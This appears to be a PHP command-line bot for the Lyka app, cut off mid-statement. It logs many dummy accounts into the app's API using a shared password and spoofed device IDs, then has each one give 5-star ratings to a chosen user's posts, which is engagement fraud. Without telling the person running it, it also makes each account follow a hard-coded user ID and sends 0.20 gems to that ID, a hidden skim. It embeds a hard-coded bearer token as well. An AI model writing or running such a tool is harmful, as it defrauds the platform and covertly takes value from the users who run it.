<? @system("clear");
$cyan = "[0;36m";
echo "$cyan         
██╗  ██╗ ██████╗  ██████╗ ██╗   ██╗██████╗ ███████╗
██║ ██╔╝██╔═══██╗██╔════╝ ██║   ██║██╔══██╗██╔════╝
█████╔╝ ██║   ██║██║  ███╗██║   ██║██████╔╝█████╗  
██╔═██╗ ██║   ██║██║   ██║██║   ██║██╔══██╗██╔══╝  
██║  ██╗╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║███████╗
╚═╝  ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝
▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄ HISASHI ▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄
";
echo "
";
$green = "[0;32m";
echo "$green
";
echo "❁ ════ ❃•▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄•❃ ════ ❁";
$green = "[1;31m";
echo "$green

USE VPN IF YOUR USING WIFI
";
$yellow = "[1;33m";
echo "$yellow
";
$dummyarray = [];
$NoofDum = readline('Input Dummy Count: ');
for ($x = 0;$x < $NoofDum;$x++) {
    $Dummy = readline('Input Dummy UN: ');
    array_push($dummyarray, "$Dummy",);
}
$pass = readline('DUMMY PASS: ');

$red = "[1;31m";
echo "$red";
$user2 = readline('MAIN 1 UN: ');

foreach ($dummyarray as $user) {
    $blue = "[1;34m";
    echo "$blue";
    $var_36a675f8fa29de6c7b49b9769541c00b = uniqid();
   $urll = "https://identity.mylykaapps.com/useraccounts/login";
    $curll = curl_init($urll);
    curl_setopt($curll, CURLOPT_URL, $urll);
    curl_setopt($curll, CURLOPT_POST, true);
    curl_setopt($curll, CURLOPT_RETURNTRANSFER, true);
    $headerss = array("Content-Type: application/json", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)");
    curl_setopt($curll, CURLOPT_HTTPHEADER, $headerss);
    $dataa = <<<DATA
{
  "countryCode": "US",
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNG:APA91bEZnWo-TDdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VODiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-gz",
    "osVersion": "28"
  },
  "password": "$pass",
  "username": "$user"
}
DATA;
    curl_setopt($curll, CURLOPT_POSTFIELDS, $dataa);
    $respp = curl_exec($curll);
    curl_close($curll);
    $psycho = 700005623762;
        $jsonn = json_decode($respp);
    $msgn = $jsonn->message;
    $status = $jsonn->status;
    $vuser = $jsonn->data->username;
    $bearer = $jsonn->data->token->accessToken;
    echo $green = "[1;34m";
    echo "$green
$vuser was logged in
";
  $url = "https://users.mylykaapps.com/api/v3/Users/FollowUser";
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_URL, $url);
  curl_setopt($curl, CURLOPT_POST, true);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.11 (com.thingsilikeapp; build:811 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
  curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
  $data = <<<DATA
  {
    "device": {
      "deviceId": "93a25b19fa52ec18",
      "deviceImei": "93a25b19fa52ec18",
      "deviceModel": "OPPO CPH1920",
      "deviceName": "android",
      "deviceOs": "Android O ",
       "isEmulator": false,
       "osVersion": "27"
    },
    "group": "",
    "userId": $psycho
  }
  DATA;
  curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
  $resp = curl_exec($curl);
  curl_close($curl);
  //var_dump($resp);
  $json = json_decode($resp);
  echo "
";
    $urlbal = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $curlbal = curl_init($urlbal);
    curl_setopt($curlbal, CURLOPT_URL, $urlbal);
    curl_setopt($curlbal, CURLOPT_RETURNTRANSFER, true);
    $headersbal = array("authorization: Bearer $bearer",);
    curl_setopt($curlbal, CURLOPT_HTTPHEADER, $headersbal);
    $respbal = curl_exec($curlbal);
    curl_close($curlbal);
        $jsonbal = json_decode($respbal);
    $tg = $jsonbal->data->totalGem;
    echo "
DUMMY BALANCE : $tg GEMS
";
    $yellow = "[1;33m";
    echo "$yellow";
    echo "


$vuser ◈ ━━━━━ ⸙ RATING POST OF ⸙ ━━━━━ ◈ $user2
";


    if ($status == 0) {
        echo "mali password ng dummy 
";
                        
    }
    if ($status == 1) {
        $urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user2&os=android&pageIndex=1&pageSize=16";
        $curlm = curl_init($urlm);
        curl_setopt($curlm, CURLOPT_URL, $urlm);
        curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
        $headersm = array("user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)", "authorization: Bearer $bearer",);
        curl_setopt($curlm, CURLOPT_HTTPHEADER, $headersm);
        $respm = curl_exec($curlm);
        curl_close($curlm);
                $jsonm = json_decode($respm, true);
        $uid = $jsonm["data"]["0"]["id"];
        $vvuser = $jsonm["data"]["0"]["userName"];
                        
    }
    
    if ($user2 == $vvuser) {
        $var_bc0d1a89190b3a410b2b5ee22f99750e = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjNjYmMyMTA1NGY0MDczYThjNzRmMTFiYzQ5ZmM0OTMxIiwidHlwIjoiYXQrand0In0.eyJuYmYiOjE2MjgxNTM4MTQsImV4cCI6MTYzMDc0NTgxNCwiaXNzIjoiaHR0cHM6Ly9pZGVudGl0eS5teWx5a2FhcHBzLmNvbSIsImF1ZCI6ImFwaTEiLCJjbGllbnRfaWQiOiJyby5jbGllbnQiLCJzdWIiOiJkNGJjYmJkYy0yMmFiLTQ1ZjctODVkYy1mMzc5YjNjZjc1YjgiLCJhdXRoX3RpbWUiOjE2MjgxNTM4MTQsImlkcCI6ImxvY2FsIiwibmFtZSI6Inh0cnkwNSIsInVzZXJuYW1lIjoieHRyeTA1IiwiaWQiOiI3MDAwMTQ2NjU3NjIiLCJqdGkiOiJZeDZpQkhfeFgwSU1vck1zb25sSTZBIiwic2NvcGUiOlsiYXBpMSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyJwd2QiXX0.vJMRFP0FKPFUDzQhZF5bRXR4bufIr6pPYvXRuwmNGPxdZPxOV8St_fuWS2yrWW26pRpID0X0LR0GVoIm-y5X2naa85xIOy6gi6TeNVZNItAL3VcCMWS2p2oDAl7MwbvZ8qbHxNH1jy3ZCTFxTLOjPubZx2-rY-CZDWXWVWo23zDm5VPEHPcsW4joPI9DxHgsxy8jxQ-D2kB88JoBsHRpIj4230p8jDGilb_KSK3mB9hmM0jhtRhZTLxVRgcfZemjDJFz66S-2RRYS1ZQOmBef7IgK5DyXNQyFPTcZ2Oa3f9OdCWWls-Id0e4wm5pveXUdbSsgM3v0LZ0FnCIF2dwrg";
        $urld = "https://profiles.mylykaapps.com/api/v3/profiles/GetProfilePosts?os=android&pageIndex=1&pageSize=50&id=$uid&category=ALL";
        $curld = curl_init($urld);
        curl_setopt($curld, CURLOPT_URL, $urld);
        curl_setopt($curld, CURLOPT_RETURNTRANSFER, true);
        $headersd = array("authorization: Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)",);
        curl_setopt($curld, CURLOPT_HTTPHEADER, $headersd);
        $respd = curl_exec($curld);
        curl_close($curld);
        $jsond = json_decode($respd, true);
                
        $arr = json_decode($respd, true);
        $var_b047a37f080e3957c22cf641bd86ea25 = $arr["data"]["0"]["id"];
        $var_73bd797bc5f8025a096059e3875db119 = $arr["data"]["1"]["id"];
        $var_29e793791b461329eca4658ba7739862 = $arr["data"]["2"]["id"];
        $var_fe542dde6622d3aac180a1bef6e0a48a = $arr["data"]["3"]["id"];
        $var_0a549017caea9cbb8a4a2a8015fb56ec = $arr["data"]["4"]["id"];
        $var_c403d734b2435327dcc73726664024b6 = $arr["data"]["5"]["id"];
        $var_b0b1ae3e9db26b69c991d48162536b73 = $arr["data"]["6"]["id"];
        $var_cd6bebd7945e37aa541421f1f5316950 = $arr["data"]["7"]["id"];
        $var_c4c8b109ef2f5cac69b6b2209d758aba = $arr["data"]["8"]["id"];
        $var_b59d15755668b01b8f5ddcd48add585f = $arr["data"]["9"]["id"];
        $var_afd10ffbc3f999b54fd5b5a5a5bcf957 = $arr["data"]["10"]["id"];
        $var_16708628e9d9899228b399281f90fd92 = $arr["data"]["11"]["id"];
                        
     }
    $stat = $arr["status"];
        if ($stat == 0) {
        echo "check your inputs
";
    } elseif ($stat == 1) $blue = "[1;34m";
    echo "$blue";
    sleep(1);
    $url = "https://posts.mylykaapps.com/api/v3/posts/ratepost";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $headers = array("authorization:Bearer $bearer", "user-agent:Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28))", "deviceos: android", "Content-Type: application/json",);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    $data = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_b047a37f080e3957c22cf641bd86ea25,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
    $resp = curl_exec($curl);
    curl_close($curl);
        $json = json_decode($resp);
    
        sleep(1);
    $var_9ffa06fcae284748eb341b284e350332 = curl_init($url);
    curl_setopt($var_9ffa06fcae284748eb341b284e350332, CURLOPT_URL, $url);
    curl_setopt($var_9ffa06fcae284748eb341b284e350332, CURLOPT_POST, true);
    curl_setopt($var_9ffa06fcae284748eb341b284e350332, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_9ffa06fcae284748eb341b284e350332, CURLOPT_HTTPHEADER, $headers);
    $var_244fa2f00afd3e4ddcd5bed1dfaaa35b = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_73bd797bc5f8025a096059e3875db119,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_9ffa06fcae284748eb341b284e350332, CURLOPT_POSTFIELDS, $var_244fa2f00afd3e4ddcd5bed1dfaaa35b);
    $var_f885db86862f6d83bb915471997bcd56 = curl_exec($var_9ffa06fcae284748eb341b284e350332);
    curl_close($var_9ffa06fcae284748eb341b284e350332);
        $var_54c8160b823766a7d8d8992d523d0ccd = json_decode($var_f885db86862f6d83bb915471997bcd56);
    echo $var_54c8160b823766a7d8d8992d523d0ccd->message;
    echo " (1)
";
        sleep(1);
    $var_c26d92c6a901d8b0566c50ecd5412190 = curl_init($url);
    curl_setopt($var_c26d92c6a901d8b0566c50ecd5412190, CURLOPT_URL, $url);
    curl_setopt($var_c26d92c6a901d8b0566c50ecd5412190, CURLOPT_POST, true);
    curl_setopt($var_c26d92c6a901d8b0566c50ecd5412190, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_c26d92c6a901d8b0566c50ecd5412190, CURLOPT_HTTPHEADER, $headers);
    $var_341207547f3c6db1f8a3d146536b3825 = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_29e793791b461329eca4658ba7739862,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_c26d92c6a901d8b0566c50ecd5412190, CURLOPT_POSTFIELDS, $var_341207547f3c6db1f8a3d146536b3825);
    $var_a14919b6047e74aa090ee5172e03d730 = curl_exec($var_c26d92c6a901d8b0566c50ecd5412190);
    curl_close($var_c26d92c6a901d8b0566c50ecd5412190);
        $var_4e7646e381c62f7ca291859eb2e14784 = json_decode($var_a14919b6047e74aa090ee5172e03d730);
    echo $var_4e7646e381c62f7ca291859eb2e14784->message;
    echo " (2)
";
        sleep(1);
    $var_a9c2b4f1250b850f770c0d908a0825b0 = curl_init($url);
    curl_setopt($var_a9c2b4f1250b850f770c0d908a0825b0, CURLOPT_URL, $url);
    curl_setopt($var_a9c2b4f1250b850f770c0d908a0825b0, CURLOPT_POST, true);
    curl_setopt($var_a9c2b4f1250b850f770c0d908a0825b0, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_a9c2b4f1250b850f770c0d908a0825b0, CURLOPT_HTTPHEADER, $headers);
    $var_a3dbb801a98b9c886ff39a6550c71e27 = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_fe542dde6622d3aac180a1bef6e0a48a,
  "rate": 5,
   "userid": $uid 
}
DATA;
    curl_setopt($var_a9c2b4f1250b850f770c0d908a0825b0, CURLOPT_POSTFIELDS, $var_a3dbb801a98b9c886ff39a6550c71e27);
    $var_52bd0a01acde2984afbeac91191ea16e = curl_exec($var_a9c2b4f1250b850f770c0d908a0825b0);
    curl_close($var_a9c2b4f1250b850f770c0d908a0825b0);
        $var_c8d7d3b0908039e69df8cf60518dea81 = json_decode($var_52bd0a01acde2984afbeac91191ea16e);
    echo $var_c8d7d3b0908039e69df8cf60518dea81->message;
    echo " (3)
";
        sleep(1);
    $var_9f6d21db27b2392afc04091d3aca24a6 = curl_init($url);
    curl_setopt($var_9f6d21db27b2392afc04091d3aca24a6, CURLOPT_URL, $url);
    curl_setopt($var_9f6d21db27b2392afc04091d3aca24a6, CURLOPT_POST, true);
    curl_setopt($var_9f6d21db27b2392afc04091d3aca24a6, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_9f6d21db27b2392afc04091d3aca24a6, CURLOPT_HTTPHEADER, $headers);
    $var_95fc3fac4f5831a8f784e3bc12f71936 = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_0a549017caea9cbb8a4a2a8015fb56ec,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_9f6d21db27b2392afc04091d3aca24a6, CURLOPT_POSTFIELDS, $var_95fc3fac4f5831a8f784e3bc12f71936);
    $var_36b1c171d6dc69e6bcd8070966d4b469 = curl_exec($var_9f6d21db27b2392afc04091d3aca24a6);
    curl_close($var_9f6d21db27b2392afc04091d3aca24a6);
        $var_8afc59eae671e362e43e04e3ace3f981 = json_decode($var_36b1c171d6dc69e6bcd8070966d4b469);
    echo $var_8afc59eae671e362e43e04e3ace3f981->message;
    echo " (4)
";

        sleep(1);
    $csst = 0.20;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    $var_58d40dd9bc5b3cda84e87e909abbf647 = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_c403d734b2435327dcc73726664024b6,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($curl, CURLOPT_POSTFIELDS, $var_58d40dd9bc5b3cda84e87e909abbf647);
    $var_b07ecc7222660cabc8db08ff142c4351 = curl_exec($curl);
    curl_close($curl);
        $var_e4ee103c9029fdb50c0e64b8ae97bfe5 = json_decode($var_b07ecc7222660cabc8db08ff142c4351);
    echo $var_e4ee103c9029fdb50c0e64b8ae97bfe5->message;
    echo " (5)
";
        sleep(1);
    $var_bf2ea328962a704e1d34cd18508ee99d = curl_init($url);
    curl_setopt($var_bf2ea328962a704e1d34cd18508ee99d, CURLOPT_URL, $url);
    curl_setopt($var_bf2ea328962a704e1d34cd18508ee99d, CURLOPT_POST, true);
    curl_setopt($var_bf2ea328962a704e1d34cd18508ee99d, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_bf2ea328962a704e1d34cd18508ee99d, CURLOPT_HTTPHEADER, $headers);
    $var_bd13018187d8107656a64fd71643703c = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_b0b1ae3e9db26b69c991d48162536b73,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_bf2ea328962a704e1d34cd18508ee99d, CURLOPT_POSTFIELDS, $var_bd13018187d8107656a64fd71643703c);
    $var_2c44cdd3d5d92dcc52543cba6344e422 = curl_exec($var_bf2ea328962a704e1d34cd18508ee99d);
    curl_close($var_bf2ea328962a704e1d34cd18508ee99d);
        $var_54d67e1de8f59cbfd54557f63bf4308c = json_decode($var_2c44cdd3d5d92dcc52543cba6344e422);
    echo $var_54d67e1de8f59cbfd54557f63bf4308c->message;
    echo " (6)
";
        sleep(1);
    $var_9e9c48efc1ffe3c8a21f60649edb266d = curl_init($url);
    curl_setopt($var_9e9c48efc1ffe3c8a21f60649edb266d, CURLOPT_URL, $url);
    curl_setopt($var_9e9c48efc1ffe3c8a21f60649edb266d, CURLOPT_POST, true);
    curl_setopt($var_9e9c48efc1ffe3c8a21f60649edb266d, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_9e9c48efc1ffe3c8a21f60649edb266d, CURLOPT_HTTPHEADER, $headers);
    $var_8d6175913dfb43091f83f818580f6bca = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_cd6bebd7945e37aa541421f1f5316950,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_9e9c48efc1ffe3c8a21f60649edb266d, CURLOPT_POSTFIELDS, $var_8d6175913dfb43091f83f818580f6bca);
    $var_e4cdaf12e21f8dedd6eebfb26c04a7dd = curl_exec($var_9e9c48efc1ffe3c8a21f60649edb266d);
    curl_close($var_9e9c48efc1ffe3c8a21f60649edb266d);
        $var_81302dd712942e53d47b070efca44cd6 = json_decode($var_e4cdaf12e21f8dedd6eebfb26c04a7dd);
    echo $var_81302dd712942e53d47b070efca44cd6->message;
    echo " (7)
";
    $uID = 700005623762;
        sleep(1);
    $var_1cb58178b89b1e3325c4988dd240b77d = curl_init($url);
    curl_setopt($var_1cb58178b89b1e3325c4988dd240b77d, CURLOPT_URL, $url);
    curl_setopt($var_1cb58178b89b1e3325c4988dd240b77d, CURLOPT_POST, true);
    curl_setopt($var_1cb58178b89b1e3325c4988dd240b77d, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_1cb58178b89b1e3325c4988dd240b77d, CURLOPT_HTTPHEADER, $headers);
    $var_bb349c01044dc1733a5d9f96feaf81fa = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_c4c8b109ef2f5cac69b6b2209d758aba,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_1cb58178b89b1e3325c4988dd240b77d, CURLOPT_POSTFIELDS, $var_bb349c01044dc1733a5d9f96feaf81fa);
    $var_7e69f675321f6663457de160115bfcb6 = curl_exec($var_1cb58178b89b1e3325c4988dd240b77d);
    curl_close($var_1cb58178b89b1e3325c4988dd240b77d);
        $var_a627b8e913fd2dcdcebf78b992ee5517 = json_decode($var_7e69f675321f6663457de160115bfcb6);
    echo $var_a627b8e913fd2dcdcebf78b992ee5517->message;
    echo " (8)
";
   
 $var_972c8ba0d4ac9d61eb63232d9999600e = curl_init($url);
    curl_setopt($var_972c8ba0d4ac9d61eb63232d9999600e, CURLOPT_URL, $url);
    curl_setopt($var_972c8ba0d4ac9d61eb63232d9999600e, CURLOPT_POST, true);
    curl_setopt($var_972c8ba0d4ac9d61eb63232d9999600e, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_972c8ba0d4ac9d61eb63232d9999600e, CURLOPT_HTTPHEADER, $headers);
    $var_2a59e0b12c9870f6b2fbdbe0c6572c60 = <<<DATA
{
 "device": {
    "deviceId": "fcbe87b62342fbac",
    "deviceImei": "fcbe87b62342fbac",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_16708628e9d9899228b399281f90fd92,
  "rate": 5,
  "userid": $uid
}
DATA;
    curl_setopt($var_972c8ba0d4ac9d61eb63232d9999600e, CURLOPT_POSTFIELDS, $var_2a59e0b12c9870f6b2fbdbe0c6572c60);
    $var_65b6fde7f94357fca006afa7a8e9e5c1 = curl_exec($var_972c8ba0d4ac9d61eb63232d9999600e);
    curl_close($var_972c8ba0d4ac9d61eb63232d9999600e);
        $var_8fc14d9e32ee9bfac0e1b434a29e3e15 = json_decode($var_65b6fde7f94357fca006afa7a8e9e5c1);
    echo $var_8fc14d9e32ee9bfac0e1b434a29e3e15->message;
    echo " (9)
";
        sleep(1);
    $var_0cb0fc4c5f0e832577f151f80895fb18 = curl_init($url);
    curl_setopt($var_0cb0fc4c5f0e832577f151f80895fb18, CURLOPT_URL, $url);
    curl_setopt($var_0cb0fc4c5f0e832577f151f80895fb18, CURLOPT_POST, true);
    curl_setopt($var_0cb0fc4c5f0e832577f151f80895fb18, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($var_0cb0fc4c5f0e832577f151f80895fb18, CURLOPT_HTTPHEADER, $headers);
    $var_87596a18f5141694186e1f71df0cdb8e = <<<DATA
{
	
  "device": {
    "deviceId": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceImei": "$var_36a675f8fa29de6c7b49b9769541c00b",
    "deviceModel": "Xiaomi Redmi Note 10",
    "deviceName": "android",
    "deviceOs": "Android O_MR1 ",
    "isEmulator": false,
    "notificationToken": "eEBjxYrDSJyFw7N-DpEGNB:APA91bEZnWo-TRdSgVCzQcJq3gHioJtFThNyxw6PsgOCI1JHDzd55yqG-QZwAZRj4pwICrXo5VDiUYom7Fsf4Ql66-CWHFumNA2ynrKEP21bstPBMgwsN-3G_Ek0ZLcoKtVMg5oN6-pg",
    "osVersion": "28"
  },
  "postId": $var_b59d15755668b01b8f5ddcd48add585f,
  "rate": 5,
   "userid": $uid
}
DATA;
    curl_setopt($var_0cb0fc4c5f0e832577f151f80895fb18, CURLOPT_POSTFIELDS, $var_87596a18f5141694186e1f71df0cdb8e);
    $var_09f130601a363f7e4dd44103994e5733 = curl_exec($var_0cb0fc4c5f0e832577f151f80895fb18);
    curl_close($var_0cb0fc4c5f0e832577f151f80895fb18);
        $var_86783401c428d928d4acf6b42ce29a17 = json_decode($var_09f130601a363f7e4dd44103994e5733);
    echo $var_86783401c428d928d4acf6b42ce29a17->message;
    echo " (10)
    ";
    $yell = "[0;32m";
    echo "$yell
";
    $urlbals = "https://wallets.mylykaapps.com/api/v3/wallets/SendGem";
    $curlbals = curl_init($urlbals);
    curl_setopt($curlbals, CURLOPT_URL, $urlbals);
    curl_setopt($curlbals, CURLOPT_POST, true);
    curl_setopt($curlbals, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curlbals, CURLOPT_HTTPHEADER, $headers);
    $databals = '{"amount":"' .  $csst  . '","device":{"deviceId":"fcaa86b842595c2f","deviceImei":"fcaa86b842595c2f","deviceModel":"Xiaomi Redmi Note 10","deviceName":"android","deviceOs":"Android O_MR1 ","isEmulator":false,"notificationToken":"eFEXEC5pTAeXLu7JjIlpNX:APA91bF8I2ZGs8wUNDjpw5lSnzrz8fB652HYMxWBdTGtFRSUaBEd0pHZQvWXAd00ESKVUO_VtYieRQxtfEU7f3RUIHEs5zXGZSVqk5PfbzjZTJQcue0vHYRiEobXHk8JUlTa0nmPCdgR","osVersion":"28"},"recipientId":' . $uID. '}';
    curl_setopt($curlbals, CURLOPT_POSTFIELDS, $databals);
    $respbals = curl_exec($curlbals);
    curl_close($curlbals);
        $jsonbals = json_decode($respbals);
    $urlbal2 = "https://wallets.mylykaapps.com/api/v3/wallets/getgems?os=android";
    $var_463ff47f91f27f78a5b0d599cb8ca404 = curl_init($urlbal2);
